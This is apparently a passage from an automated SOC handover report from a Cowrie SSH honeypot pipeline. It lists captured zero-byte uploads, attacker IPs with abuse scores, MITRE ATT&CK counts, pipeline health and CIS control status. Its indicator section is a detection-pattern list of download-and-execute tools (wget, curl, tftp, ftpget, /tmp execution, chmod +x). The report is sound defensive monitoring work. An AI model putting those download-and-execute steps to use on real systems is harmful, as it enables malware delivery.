| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `116.206.193[.]44` | MM | Myanmar Country Co Ltd | **100** ⚠️ | 3 |
| `134.209.229[.]23` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `14.103.118[.]107` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `217.164.155[.]173` | AE | Emirates Telecommunications Corporation | **100** ⚠️ | 3 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `69.164.217[.]74` | US | Linode | **100** ⚠️ | 50 |
| `183.82.111[.]224` | IN | ACT HYD | **100** ⚠️ | 50 |
| `80.94.92[.]55` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 69 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 58 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 17 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 17 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 17 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 109 cases |
| Tool 34  | Credential Extractor        | ✅ 66 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (10.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 18 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 58 priority case(s) shown individually · 14 recon entry/entries in table (6 group(s) consolidating 32 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-25T14:51:01Z_
